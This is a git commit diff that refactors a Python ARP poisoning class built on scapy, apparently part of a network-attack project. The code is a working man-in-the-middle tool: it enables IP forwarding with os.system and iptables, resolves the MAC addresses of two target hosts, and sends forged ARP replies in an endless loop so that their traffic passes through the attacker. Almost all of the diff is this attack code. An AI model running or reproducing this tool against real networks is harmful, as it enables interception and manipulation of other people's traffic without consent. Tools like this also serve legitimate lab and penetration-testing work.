8684e70400b9bb5b296a69d7316e48c8d743db72
Alexander Vardanyan <vardart01@gmail.com>
2026-01-07 15:49:45 +0100

    Refactor arp_poisoning.py

--- src/lib/arp_poisoning.py
+++ src/lib/arp_poisoning.py
@@ -4,9 +4,19 @@ import logging
 import os
 from scapy.all import *
 
-class ARPPoisoner:
 
-    def enable_ip_forwarding(self, interface: str) -> None:
+class ARPPoisoner:
+    ip1: str
+    ip2: str
+    interface: str
+    
+    def __init__(self, ip1: str, ip2: str, interface: str):
+        self.ip1 = ip1
+        self.ip2 = ip2
+        self.interface = interface
+    
+    @staticmethod
+    def enable_ip_forwarding(interface: str) -> None:
         logging.info("IP forwarding started")
         try:
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -17,8 +27,9 @@ class ARPPoisoner:
         os.system(f"iptables -A FORWARD -i {interface} -j ACCEPT")
 
         logging.info("IP forwarding enabled")
-
-    def get_MAC_address(self, ip: str, interface: str) -> str:
+    
+    @staticmethod
+    def get_MAC_address(ip: str, interface: str) -> str:
         logging.info(f"Retrieving MAC of device with IP {ip} started")
         # srp is a Layer 2 send/receive 
         pkt, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
@@ -31,31 +42,28 @@ class ARPPoisoner:
 
         logging.info(f"MAC of device with IP {ip} retrieved")
         return pkt[0][1].hwsrc
-
-    def spoof(self, target_ip: str, spoof_ip: str, target_mac: str, interface: str) -> None:
-        # [fixed] Ether hearder added, use sendp()
-        # dst: destinatino MAC 
+    
+    @staticmethod
+    def spoof(target_ip: str, spoof_ip: str, target_mac: str, interface: str) -> None:
         packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        
-  
         sendp(packet, verbose=False, iface=interface)
 
-    def run(self, ip1: str, ip2: str, interface: str) -> None:
+    def run(self) -> None:
         logging.info("ARP poisoning started")
 
-        self.enable_ip_forwarding(interface)
+        self.enable_ip_forwarding(self.interface)
         
         try:
-            mac1 = self.get_MAC_address(ip1, interface)
-            mac2 = self.get_MAC_address(ip2, interface)
+            mac1 = self.get_MAC_address(self.ip1, self.interface)
+            mac2 = self.get_MAC_address(self.ip2, self.interface)
         except Exception as e:
             logging.error(e)
             return
 
         try:
             while True:
-                self.spoof(ip1, ip2, mac1, interface)
-                self.spoof(ip2, ip1, mac2, interface)
+                self.spoof(self.ip1, self.ip2, mac1, self.interface)
+                self.spoof(self.ip2, self.ip1, mac2, self.interface)
                 time.sleep(2)
         except KeyboardInterrupt:
             logging.info("ARP poisoning interrupted")
